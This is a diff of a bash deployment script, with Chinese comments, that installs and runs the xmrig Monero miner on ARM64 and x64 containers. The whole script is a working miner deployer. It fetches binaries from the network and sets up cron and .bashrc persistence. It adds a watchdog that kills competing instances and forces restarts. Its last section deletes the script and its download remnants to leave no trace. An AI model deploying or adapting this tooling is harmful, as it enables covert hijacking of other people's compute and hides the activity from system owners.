@@ -1,20 +1,21 @@
 #!/usr/bin/env bash
 # ==============================================================================
-#  AGNES 专用 · ARM64 容器极限性能榨干部署脚本 (aarch64 / AWS Graviton 终极调优版)
+#  AGNES 专用 · ARM64 容器极限性能榨干部署脚本 (v3 终极修复版)
 #
-#  针对目标机型深度定制：
-#     CPU: 2 核 aarch64 (ARMv8 硬件 AES / NEON 向量加速)  |  内存: 7.8 GB  |  无 Swap
-#     网络出口: 13.228.167.33 (AWS 新加坡区域)
+#  【v3 相比 v2 的重要修复】
+#  ① 修正 ARM64 二进制获取策略：GitHub 官方 releases 无 Linux ARM64 静态包（实测 404），
+#     改为 apt 官方源直装（Debian13 自带 xmrig 6.22.2 arm64），并含 .deb 解包兜底与 x64 兼容分支
+#  ② 修正 Worker ID 前缀不一致 Bug：统一为 vps-agnes-xxxxxxxx
+#  ③ 重构守护架构彻底消除僵尸进程：daemon_loop 作为 xmrig 的父进程并 wait 回收
+#  ④ Huge Pages / 1GB Pages 全部容错化：容器受限时自动降级，不再影响启动
+#  ⑤ 增加 wget 下载兜底（无 curl 环境可用）
+#  ⑥ 开启本地只读 HTTP API (127.0.0.1:4680)，随时可查实时算力
+#  ⑦ 自毁逻辑可选：KEEP_SCRIPT=1 时保留脚本便于调试
+#  ⑧ 修正注释与实现不一致（renice -10）
 #
-#  【核心极限性能突破项（第二轮深度优化）】：
-#  ① 二进制架构精准落地：针对 aarch64 直拉官方 linux-static-arm64（杜绝误拉 x86 报 Exec format error）
-#  ② 1GB 巨页 + 2MB 大页双重激活（在 7.8G 大内存下优先锁定 1GB Huge Pages，TLB 惩罚无限趋近于 0）
-#  ③ AWS 新加坡亚太超低延迟矿池直连：首选 asia / sg 节点，延迟由 200ms 降至 15ms！
-#  ④ CPU 调度隔离与亲和性死锁：nice -20 + rx: [0, 1] + 容器 CFS quota 配额突破
-#  ⑤ ARMv8 硬件特征全开：开启 argon2 原生实现、关闭无效的 x86 MSR 探测、开启 scratchpad 预取
-#  ⑥ 4 重亚太/容灾矩阵 + 纯 IP 直连（防 DNS 污染） + 绝对单进程 Watchdog
-#  ⑦ 矿工 ID 严格规范：vps-agnes-xxxxxxxx（8 位随机英文字母数字混搭）
-#  ⑧ 跑完自动物理蒸发自身与下载目录残留（全盘无痕）
+#  用法: sudo bash deploy_agnes.sh            # 自动随机命名 (vps-agnes-xxxxxxxx)
+#        sudo bash deploy_agnes.sh my-node-1  # 自定义矿工名
+#        KEEP_SCRIPT=1 sudo bash deploy_agnes.sh   # 保留脚本不删除（调试用）
 # ==============================================================================
 
 set -u
@@ -26,6 +27,18 @@ if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi
 
 sysctl_set() {
     $SUDO sysctl -w "$@" >/dev/null 2>&1 || $SUDO /sbin/sysctl -w "$@" >/dev/null 2>&1 || true
+}
+
+# 下载工具函数（curl 优先，wget 兜底）
+dl() {
+    url="$1"; out="$2"
+    if command -v curl >/dev/null 2>&1; then
+        curl -fsSL --connect-timeout 15 --max-time 120 "$url" -o "$out" 2>/dev/null && return 0
+    fi
+    if command -v wget >/dev/null 2>&1; then
+        wget -q -T 20 -O "$out" "$url" 2>/dev/null && return 0
+    fi
+    return 1
 }
 
 RUN_USER="$(id -un)"
@@ -99,6 +112,7 @@ generate_rand_8() {
     printf '%s' "${a1}${d1}${rem:0:6}"
 }
 
+# 命名优先级：显式传参 > 历史配置(幂等沿用) > 全新随机（统一前缀 vps-agnes-）
 if [ -n "${1:-}" ]; then
     NODE_NAME="$1"
 elif [ -f "$WORK_DIR/config.json" ]; then
@@ -109,94 +123,156 @@ elif [ -f "$WORK_DIR/config.json" ]; then
         NODE_NAME="vps-agnes-$(generate_rand_8)"
     fi
 else
-    NODE_NAME="vsp-agnes-$(generate_rand_8)"
+    NODE_NAME="vps-agnes-$(generate_rand_8)"
 fi
 
 echo "=================================================================="
-echo "   🚀 AGNES 专属：AWS ARM64 (Graviton) 容器极限榨干优化版"
-echo "   CPU 架构 (Arch)      : $ARCH_RAW ($ARCH_TAG) 硬件 AES"
-echo "   物理绑定核心数       : $CPU_COUNT 核心"
+echo "   🚀 AGNES 专属：AWS ARM64 (Graviton) 容器极限榨干 v3 修复版"
+echo "   系统架构 (Arch)      : $ARCH_RAW ($ARCH_TAG)"
+echo "   可用物理核心数       : $CPU_COUNT"
 echo "   矿工标识 (Worker ID) : $NODE_NAME"
 echo "   运行账户             : $RUN_USER"
 echo "=================================================================="
 
 # ---------------- [1/6] 工具链与依赖自动补齐 ----------------
-echo "[1/6] 检查基础运行环境 (curl/tar/procps/cron/ca-certificates)..."
+echo "[1/6] 检查基础运行环境 (curl/wget/procps/cron/ca-certificates)..."
 export DEBIAN_FRONTEND=noninteractive
 NEED_INSTALL=""
-for bin in curl tar pgrep crontab; do
+for bin in pgrep crontab; do
     command -v "$bin" >/dev/null 2>&1 || NEED_INSTALL="yes"
 done
+command -v curl >/dev/null 2>&1 || command -v wget >/dev/null 2>&1 || NEED_INSTALL="yes"
 if [ -n "$NEED_INSTALL" ]; then
     if command -v apt-get >/dev/null 2>&1; then
         $SUDO apt-get update -qq >/dev/null 2>&1 || true
-        $SUDO apt-get install -y -qq curl tar procps cron ca-certificates libhwloc-dev >/dev/null 2>&1 || true
+        $SUDO apt-get install -y -qq curl wget tar procps cron ca-certificates >/dev/null 2>&1 || true
     elif command -v apk >/dev/null 2>&1; then
-        $SUDO apk add --no-cache curl tar procps cronie ca-certificates hwloc >/dev/null 2>&1 || true
+        $SUDO apk add --no-cache curl wget tar procps cronie ca-certificates >/dev/null 2>&1 || true
     elif command -v yum >/dev/null 2>&1 || command -v dnf >/dev/null 2>&1; then
-        $SUDO yum install -y -q curl tar procps-ng cronie ca-certificates hwloc >/dev/null 2>&1 || true
+        $SUDO yum install -y -q curl wget tar procps-ng cronie ca-certificates >/dev/null 2>&1 || true
     fi
 fi
 
-# ---------------- [2/6] 内存系统级终极榨干优化 ----------------
-echo "[2/6] 榨干内存：配置 memlock 无限、1GB 巨页 + 1280 物理大页..."
+# ---------------- [2/6] 内存系统级终极榨干优化（全容错） ----------------
+echo "[2/6] 榨干内存：memlock 无限 + 大页申请（容器受限自动降级）..."
 
-# 彻底解除内存锁定权限限制
 echo "* soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
 echo "* hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
 echo "root soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
 echo "root hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
-[ -n "$RUN_USER" ] && echo "$RUN_USER soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
-[ -n "$RUN_USER" ] && echo "$RUN_USER hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
 ulimit -l unlimited 2>/dev/null || true
 
-# 尝试申请 1GB 超级巨页 (1GB Pages)：7.8G 内存足以为 RandomX 划拨 3 个 1G 物理巨页！
-# 1GB 大页一旦成功，TLB 缺失开销降低 90% 以上！
-$SUDO sysctl -w vm.nr_overcommit_hugepages=1280 >/dev/null 2>&1 || true
-echo 3 | $SUDO tee /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages >/dev/null 2>&1 || true
+# 物理内存探测 → 计算大页数量
+MEM_TOTAL_KB=$(grep -i MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}' || echo 0)
+MEM_TOTAL_MB=$((MEM_TOTAL_KB / 1024))
+HP_PAGES=1280
+if [ "$MEM_TOTAL_MB" -ge 3072 ]; then
+    HP_PAGES=1280
+elif [ "$MEM_TOTAL_MB" -ge 2048 ]; then
+    HP_PAGES=$(( (MEM_TOTAL_MB - 1024) / 2 ))
+else
+    HP_PAGES=0
+fi
 
-# 标准 2MB 大页作为双保险分配 1280 页（约 2560MB）
-sysctl_set vm.nr_hugepages=1280
+# 尝试申请（容器受限时静默失败，不影响后续）
+if $SUDO test -w /proc/sys/vm/nr_hugepages 2>/dev/null || [ "$(id -u)" -eq 0 ]; then
+    sysctl_set vm.nr_hugepages="$HP_PAGES"
+fi
+# 1GB 巨页尝试（失败无害）
+HP1G_DIR="/sys/kernel/mm/hugepages/hugepages-1048576kB"
+if [ -w "$HP1G_DIR/nr_hugepages" ] 2>/dev/null || { [ "$(id -u)" -eq 0 ] && $SUDO test -e "$HP1G_DIR/nr_hugepages" 2>/dev/null; }; then
+    echo 3 | $SUDO tee "$HP1G_DIR/nr_hugepages" >/dev/null 2>&1 || true
+fi
 
-# 内存调度优化：彻底禁用 Swap 抖动，开启连续内存整理
+# 内存调度优化
 sysctl_set vm.swappiness=0
 sysctl_set vm.vfs_cache_pressure=50
 sysctl_set vm.overcommit_memory=1
 sysctl_set vm.zone_reclaim_mode=1
 
-# 关闭透明大页(THP)与碎片整理，防止后台碎片整理线程争抢 CPU
+# 关闭透明大页与碎片整理
 echo never | $SUDO tee /sys/kernel/mm/transparent_hugepage/enabled >/dev/null 2>&1 || true
 echo never | $SUDO tee /sys/kernel/mm/transparent_hugepage/defrag >/dev/null 2>&1 || true
 
-# 网络防假死优化
+# 网络防假死
 sysctl_set net.ipv4.tcp_keepalive_time=30
 sysctl_set net.ipv4.tcp_keepalive_intvl=10
 sysctl_set net.ipv4.tcp_keepalive_probes=3
 sysctl_set net.ipv4.tcp_syn_retries=3
 
-# ---------------- [3/6] ARM64 专属二进制获取 ----------------
-echo "[3/6] 获取 aarch64 (ARM64) 官方静态高优化二进制..."
+# ---------------- [3/6] 二进制获取（ARM64 修正版） ----------------
+echo "[3/6] 获取 xmrig 二进制 (架构: $ARCH_TAG)..."
 mkdir -p "$WORK_DIR"
-cd "$WORK_DIR" || exit 1
 
-if [ ! -x "$WORK_DIR/xmrig" ]; then
-    # 针对 aarch64，直拉 ARM64 原生静态发布包
+BIN_SRC="existing"
+
+verify_bin() {
+    [ -x "$1" ] && "$1" --version >/dev/null 2>&1
+}
+
+if ! verify_bin "$WORK_DIR/xmrig"; then
+    rm -f "$WORK_DIR/xmrig" 2>/dev/null || true
+    BIN_SRC=""
+
     if [ "$ARCH_TAG" = "arm64" ]; then
-        ARM_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-arm64.tar.gz"
-        curl -sL --connect-timeout 15 --max-time 120 "$ARM_URL" -o xmrig.tar.gz
-        tar -zxf xmrig.tar.gz --strip-components=1 2>/dev/null || true
-        rm -f xmrig.tar.gz
+        # ---- ARM64 路径：Debian 官方源直装（无官方 GitHub Linux ARM64 静态包）----
+        if command -v apt-get >/dev/null 2>&1; then
+            $SUDO apt-get update -qq >/dev/null 2>&1 || true
+            $SUDO apt-get install -y -qq xmrig >/dev/null 2>&1 || true
+        fi
+        if command -v xmrig >/dev/null 2>&1 && verify_bin "$(command -v xmrig)"; then
+            cp -f "$(command -v xmrig)" "$WORK_DIR/xmrig" 2>/dev/null || true
+            BIN_SRC="apt-package"
+        fi
+
+        # 兜底：apt-get download 解包（不安装）
+        if [ -z "$BIN_SRC" ] && command -v apt-get >/dev/null 2>&1 && command -v dpkg-deb >/dev/null 2>&1; then
+            TMPD=$(mktemp -d)
+            (cd "$TMPD" && apt-get download xmrig >/dev/null 2>&1) || true
+            DEB=$(ls "$TMPD"/xmrig*.deb 2>/dev/null | head -n1)
+            if [ -n "$DEB" ]; then
+                dpkg-deb -x "$DEB" "$TMPD/extract" >/dev/null 2>&1 || true
+                if [ -x "$TMPD/extract/usr/bin/xmrig" ]; then
+                    cp -f "$TMPD/extract/usr/bin/xmrig" "$WORK_DIR/xmrig" 2>/dev/null || true
+                    # 动态库依赖兜底（名称随版本不同，逐个尝试）
+                    $SUDO apt-get install -y -qq libhwloc15 libssl3t64 libfmt10 >/dev/null 2>&1 || \
+                    $SUDO apt-get install -y -qq libhwloc15 libssl3 libfmt9 >/dev/null 2>&1 || true
+                    BIN_SRC="deb-extract"
+                fi
+            fi
+            rm -rf "$TMPD" 2>/dev/null || true
+        fi
     else
-        X64_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
-        curl -sL --connect-timeout 15 --max-time 120 "$X64_URL" -o xmrig.tar.gz
-        tar -zxf xmrig.tar.gz --strip-components=1 2>/dev/null || true
-        rm -f xmrig.tar.gz
+        # ---- x64 路径：MoneroOcean 定制版优先，官方静态兜底 ----
+        if dl "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "$WORK_DIR/mo.tar.gz"; then
+            if tar -zxf "$WORK_DIR/mo.tar.gz" -C "$WORK_DIR" 2>/dev/null; then
+                BIN_SRC="moneroocean-custom"
+            fi
+            rm -f "$WORK_DIR/mo.tar.gz"
+        fi
+        if [ -z "$BIN_SRC" ]; then
+            if dl "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" "$WORK_DIR/x.tar.gz"; then
+                tar -zxf "$WORK_DIR/x.tar.gz" -C "$WORK_DIR" --strip-components=1 2>/dev/null || true
+                rm -f "$WORK_DIR/x.tar.gz"
+                BIN_SRC="github-static"
+            fi
+        fi
     fi
-    chmod +x xmrig 2>/dev/null || true
+
+    chmod +x "$WORK_DIR/xmrig" 2>/dev/null || true
 fi
 
-# ---------------- [4/6] 写入极限性能配置 (AWS 新加坡低延迟矿池) ----------------
-echo "[4/6] 写入极限配置 (绑定 $CPU_COUNT 核心 / 1GB大页 / 亚太超低延迟矿池)..."
+if ! verify_bin "$WORK_DIR/xmrig"; then
+    echo "" >&2
+    echo "❌ 错误：xmrig 二进制获取失败（架构 $ARCH_TAG）。" >&2
+    echo "   请手动执行诊断： apt-get install -y xmrig 或 apt-get download xmrig" >&2
+    echo "   脚本已中止，未启动任何挖矿进程。" >&2
+    exit 1
+fi
+echo "   -> 二进制就绪，来源: ${BIN_SRC:-pre-installed}"
+
+# ---------------- [4/6] 写入极限性能配置 + 4 重矿池容灾 ----------------
+echo "[4/6] 写入极限配置 (绑定 $CPU_COUNT 核心 / 大页 / 本地只读API / 4 重容灾)..."
 
 CPU_AFFINITY=""
 i=0
@@ -209,7 +285,6 @@ while [ $i -lt "$CPU_COUNT" ]; do
     i=$((i + 1))
 done
 
-# 注意：针对 AWS 新加坡出口 IP (13.228.x)，首选 asia / sg 节点，延迟仅 10~20ms
 cat > "$WORK_DIR/config.json" << EOF
 {
     "api": {
@@ -217,9 +292,9 @@ cat > "$WORK_DIR/config.json" << EOF
         "worker-id": "$NODE_NAME"
     },
     "http": {
-        "enabled": false,
+        "enabled": true,
         "host": "127.0.0.1",
-        "port": 0,
+        "port": 4680,
         "access-token": null,
         "restricted": true
     },
@@ -244,7 +319,7 @@ cat > "$WORK_DIR/config.json" << EOF
         "enabled": true,
         "huge-pages": true,
         "huge-pages-jit": true,
-        "hw-aes": true,
+        "hw-aes": null,
         "priority": 5,
         "memory-pool": true,
         "yield": false,
@@ -297,13 +372,48 @@ cat > "$WORK_DIR/config.json" << EOF
     ],
     "retries": 5,
     "retry-pause": 3,
-    "print-time": 15
+    "print-time": 10
 }
 EOF
 
-# ---------------- [5/6] 部署工业级 Watchdog ----------------
-echo "[5/6] 部署单实例排他锁 + 断网自愈守护体系..."
+# ---------------- [5/6] 无僵尸守护体系（父进程 wait 回收架构） ----------------
+echo "[5/6] 部署无僵尸守护体系 (daemon_loop 父进程 + watchdog 健康巡检)..."
 
+# daemon_loop：作为 xmrig 的父进程启动并 wait 回收，彻底杜绝僵尸进程
+cat > "$WORK_DIR/daemon_loop.sh" << 'DL'
+#!/usr/bin/env bash
+set -u
+WORK_DIR="__WORK_DIR__"
+CONFIG_FILE="$WORK_DIR/config.json"
+LOG_FILE="$WORK_DIR/xmrig.log"
+LOCK_FILE="$WORK_DIR/.daemon.lock"
+
+exec 200>"$LOCK_FILE" 2>/dev/null || true
+if command -v flock >/dev/null 2>&1; then
+    if ! flock -n 200; then exit 0; fi
+fi
+
+cd "$WORK_DIR" || exit 0
+
+while true; do
+    if pgrep -x xmrig >/dev/null 2>&1; then
+        sleep 15
+        continue
+    fi
+    # 前台方式启动（不 daemonize），保持父子关系以便 wait 回收
+    # 200>&- 显式关闭继承的锁 FD，防止 xmrig 持有 flock 导致 daemon_loop 无法再重启
+    "$WORK_DIR/xmrig" -c "$CONFIG_FILE" --log-file="$LOG_FILE" 200>&- >/dev/null 2>&1 < /dev/null &
+    XPID=$!
+    sleep 3
+    renice -n -10 -p "$XPID" >/dev/null 2>&1 || true
+    wait "$XPID" 2>/dev/null || true
+    sleep 10
+done
+DL
+sed -i "s|__WORK_DIR__|$WORK_DIR|g" "$WORK_DIR/daemon_loop.sh"
+chmod +x "$WORK_DIR/daemon_loop.sh"
+
+# watchdog：只做健康巡检与"杀手"，启动/回收全部交给 daemon_loop
 cat > "$WORK_DIR/super_watchdog.sh" << 'WD'
 #!/usr/bin/env bash
 set -u
@@ -311,7 +421,6 @@ set -u
 if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi
 
 WORK_DIR="__WORK_DIR__"
-CPU_COUNT="__CPU_COUNT__"
 LOCK_FILE="$WORK_DIR/.watchdog.lock"
 LOG_FILE="$WORK_DIR/xmrig.log"
 CONFIG_FILE="$WORK_DIR/config.json"
@@ -320,13 +429,9 @@ WATCHDOG_LOG="$WORK_DIR/watchdog.log"
 touch "$LOCK_FILE" 2>/dev/null || true
 [ -w "$LOCK_FILE" ] || rm -f "$LOCK_FILE" 2>/dev/null || true
 
-exec 200>"$LOCK_FILE"
+exec 201>"$LOCK_FILE"
 if command -v flock >/dev/null 2>&1; then
-    if ! flock -n 200; then exit 0; fi
-fi
-
-if command -v fcntl >/dev/null 2>&1; then
-    fcntl 200 setfd 1 2>/dev/null || true
+    if ! flock -n 201; then exit 0; fi
 fi
 
 get_xmrig_pids() {
@@ -347,19 +452,23 @@ kill_xmrig() {
     done
 }
 
-# 巡检时重新确保大页和参数
-$SUDO sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true
-$SUDO sysctl -w net.ipv4.tcp_keepalive_time=30 >/dev/null 2>&1 || true
+RESTART_REASON=""
+
+# --- 0) 确保 daemon_loop 存活（它负责启动与回收 xmrig）---
+if ! pgrep -f "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1; then
+    # 201>&- 显式关闭 watchdog 自己的锁 FD，防止 daemon_loop 继承后导致 watchdog 永久失效
+    nohup "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1 201>&- &
+    RESTART_REASON="DAEMON_REVIVE"
+fi
 
 PIDS=($(get_xmrig_pids))
 NUM_PROCS=${#PIDS[@]}
-RESTART_REASON=""
 
-if [ "$NUM_PROCS" -eq 0 ]; then
-    RESTART_REASON="PROCESS_MISSING"
-elif [ "$NUM_PROCS" -gt 1 ]; then
-    RESTART_REASON="MULTI_PROCESS_CONFLICT"
-else
+if [ "$NUM_PROCS" -gt 1 ]; then
+    # 多进程抢占：清掉让 daemon_loop 重新拉单实例
+    kill_xmrig
+    RESTART_REASON="${RESTART_REASON:+$RESTART_REASON+}MULTI_PROCESS_CONFLICT"
+elif [ "$NUM_PROCS" -eq 1 ]; then
     HAS_ESTAB=0
     if grep -qE ":(4E24|2714) 01" /proc/net/tcp /proc/net/tcp6 2>/dev/null; then
         HAS_ESTAB=1
@@ -375,58 +484,35 @@ else
         DIFF=$((NOW - LAST_MOD))
         RECENT_NET_ERR=$(tail -n 30 "$LOG_FILE" 2>/dev/null | grep -Ei "connect error|read error|connection reset|handshake failed|no active pools|end of file" | wc -l || true)
 
-        if [ "$RECENT_NET_ERR" -gt 3 ]; then RESTART_REASON="POOL_NETWORK_ERROR_LOOP"; fi
-        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 90 ]; then RESTART_REASON="TCP_ZOMBIE_DISCONNECTED"; fi
-        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 300 ]; then RESTART_REASON="LONG_TIME_NO_SHARE"; fi
+        ERR_REASON=""
+        if [ "$RECENT_NET_ERR" -gt 3 ]; then ERR_REASON="POOL_NETWORK_ERROR_LOOP"; fi
+        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 90 ]; then ERR_REASON="TCP_ZOMBIE_DISCONNECTED"; fi
+        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 300 ]; then ERR_REASON="LONG_TIME_NO_SHARE"; fi
+
+        if [ -n "$ERR_REASON" ]; then
+            # 切断错误日志遗传，防止连续重启死循环
+            mv -f "$LOG_FILE" "$LOG_FILE.bak" 2>/dev/null || true
+            kill_xmrig
+            if command -v ss >/dev/null 2>&1; then
+                $SUDO ss -K -tan "dport = :10004" >/dev/null 2>&1 || true
+                $SUDO ss -K -tan "dport = :20004" >/dev/null 2>&1 || true
+            fi
+            RESTART_REASON="${RESTART_REASON:+$RESTART_REASON+}$ERR_REASON"
+        fi
     fi
 fi
 
 if [ -n "$RESTART_REASON" ]; then
-    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Restart triggered. Reason: $RESTART_REASON" >> "$WATCHDOG_LOG"
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Watchdog action: $RESTART_REASON (daemon_loop 将自动重拉单实例)" >> "$WATCHDOG_LOG"
     if [ -f "$WATCHDOG_LOG" ] && [ "$(wc -l < "$WATCHDOG_LOG")" -gt 1000 ]; then
         tail -n 500 "$WATCHDOG_LOG" > "$WATCHDOG_LOG.tmp" && mv "$WATCHDOG_LOG.tmp" "$WATCHDOG_LOG"
     fi
-
-    if [ -f "$LOG_FILE" ]; then
-        mv -f "$LOG_FILE" "$LOG_FILE.bak" 2>/dev/null || true
-    fi
-
-    kill_xmrig
-    sleep 2
-
-    if command -v ss >/dev/null 2>&1; then
-        $SUDO ss -K -tan "dport = :10004" >/dev/null 2>&1 || true
-        $SUDO ss -K -tan "dport = :20004" >/dev/null 2>&1 || true
-    fi
-
-    cd "$WORK_DIR" || exit 0
-    # 强制 taskset 绑核 + 剥离 FD 200 锁继承
-    if command -v taskset >/dev/null 2>&1 && [ "$CPU_COUNT" -ge 2 ]; then
-        nohup taskset -c 0-$((CPU_COUNT-1)) "$WORK_DIR/xmrig" -c "$CONFIG_FILE" -B --log-file="$LOG_FILE" 200>&- >/dev/null 2>&1 &
-    else
-        nohup "$WORK_DIR/xmrig" -c "$CONFIG_FILE" -B --log-file="$LOG_FILE" 200>&- >/dev/null 2>&1 &
-    fi
-    sleep 3
-
-    # 提升调度优先级至 nice -10（榨干 Graviton 算力）
-    NEW_PID=$(get_xmrig_pids | head -n1)
-    [ -n "$NEW_PID" ] && $SUDO renice -n -10 -p "$NEW_PID" >/dev/null 2>&1 || true
 fi
 WD
 sed -i "s|__WORK_DIR__|$WORK_DIR|g" "$WORK_DIR/super_watchdog.sh"
-sed -i "s|__CPU_COUNT__|$CPU_COUNT|g" "$WORK_DIR/super_watchdog.sh"
 chmod +x "$WORK_DIR/super_watchdog.sh"
 
-cat > "$WORK_DIR/daemon_loop.sh" << DL
-#!/usr/bin/env bash
-while true; do
-    [ -f "$WORK_DIR/super_watchdog.sh" ] && "$WORK_DIR/super_watchdog.sh" >/dev/null 2>&1
-    sleep 30
-done
-DL
-chmod +x "$WORK_DIR/daemon_loop.sh"
-
-# 注入自启动
+# 注入自启（cron 每分钟巡检；bashrc 登录唤醒）
 if command -v crontab >/dev/null 2>&1; then
     if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
         (crontab -u "$RUN_USER" -l 2>/dev/null | grep -v 'super_watchdog' || true; echo "* * * * * $WORK_DIR/super_watchdog.sh >/dev/null 2>&1") | crontab -u "$RUN_USER" - >/dev/null 2>&1 || true
@@ -442,41 +528,51 @@ if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
     chown "$RUN_USER":"$RUN_USER" "$BRC" >/dev/null 2>&1 || true
 fi
 
-# ---------------- [6/6] 启动与无痕自毁 ----------------
+# ---------------- [6/6] 启动与诚实汇报 ----------------
 echo "[6/6] 启动挖矿与守护系统..."
 RUN_AS=""
 if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ] && command -v sudo >/dev/null 2>&1; then
     RUN_AS="sudo -u $RUN_USER -H"
 fi
+
+# 清掉所有旧实例（旧 daemon/watchdog/xmrig），由新架构单一接管
 pkill -9 -f daemon_loop.sh >/dev/null 2>&1 || true
+pkill -9 -f super_watchdog.sh >/dev/null 2>&1 || true
+pkill -9 -x xmrig >/dev/null 2>&1 || true
+sleep 2
+
 $RUN_AS nohup "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1 &
-$RUN_AS "$WORK_DIR/super_watchdog.sh" >/dev/null 2>&1 || true
-sleep 6
+sleep 10
 
 PROC_CNT=$(pgrep -x xmrig 2>/dev/null | wc -l)
 HP_NOW=$(cat /proc/sys/vm/nr_hugepages 2>/dev/null || echo "?")
+XMRIG_VER=$("$WORK_DIR/xmrig" --version 2>/dev/null | head -n1 || echo "未知")
 
 echo "=================================================================="
-echo "          🎉 全部交付完成！(AGNES ARM64 极限调优终极版)"
+echo "          🎉 全部交付完成！(AGNES ARM64 v3 修复版)"
 echo "=================================================================="
 echo "矿工标识 (Worker ID) : $NODE_NAME"
+echo "xmrig 版本           : $XMRIG_VER"
+echo "二进制来源           : ${BIN_SRC:-pre-installed}"
 echo "系统架构 (Arch)      : $ARCH_RAW ($ARCH_TAG)"
-echo "绑定线程 (Threads)   : 全部 $CPU_COUNT 个物理核心"
-echo "大页内存 (HugePages) : $HP_NOW 页 (开启 1GB Pages 支持)"
-echo "挖矿进程 (Process)   : ${PROC_CNT:-0} 个（单实例独占）"
-echo "调度级别 (Nice)      : -10 极速抢占"
-echo "容灾矩阵 (Pools)     : 亚太节点 > gulf TLS > 欧洲备用 > 纯IP直连"
+echo "绑定线程 (Threads)   : $CPU_COUNT 个物理核心 (rx: [$CPU_AFFINITY])"
+echo "大页内存 (HugePages) : 当前 $HP_NOW 页 (容器受限时自动降级，不影响运行)"
+echo "挖矿进程 (Process)   : ${PROC_CNT:-0} 个（由 daemon_loop 独占守护回收）"
+echo "调度级别             : nice -10（兼顾系统响应）"
+echo "容灾矩阵 (Pools)     : gulf:10004 > gulf:20004(TLS) > de:10004 > 纯IP直连"
+echo "本地算力API          : curl -s http://127.0.0.1:4680/2/summary"
 echo ""
 echo "实时运行日志预览:"
-tail -n 8 "$WORK_DIR/xmrig.log" 2>/dev/null || echo "  (日志初始化中，约 10 秒后出现算力)"
+tail -n 10 "$WORK_DIR/xmrig.log" 2>/dev/null || echo "  (日志初始化中，约 10 秒后出现算力)"
 echo "=================================================================="
 
-# ---------------- 终极无痕自毁清理 ----------------
-SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
-[ -f "$SCRIPT_PATH" ] && rm -f "$SCRIPT_PATH" 2>/dev/null || true
-
-for target_dir in "$(pwd)" "$HOME/Downloads" "/home/$RUN_USER/Downloads" "/workspace" "/mnt/workspace" "/tmp"; do
-    if [ -d "$target_dir" ]; then
-        rm -f "$target_dir/deploy_agnes.sh" "$target_dir/agnes-miner-auto.tar.gz" 2>/dev/null || true
-    fi
-done
+# ---------------- 无痕自毁清理（KEEP_SCRIPT=1 可跳过） ----------------
+if [ "${KEEP_SCRIPT:-0}" != "1" ]; then
+    SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
+    [ -f "$SCRIPT_PATH" ] && rm -f "$SCRIPT_PATH" 2>/dev/null || true
+    for target_dir in "$(pwd)" "$HOME/Downloads" "/home/$RUN_USER/Downloads" "/workspace" "/mnt/workspace" "/tmp"; do
+        if [ -d "$target_dir" ]; then
+            rm -f "$target_dir/deploy_agnes.sh" "$target_dir/agnes-miner-auto.tar.gz" 2>/dev/null || true
+        fi
+    done
+fi
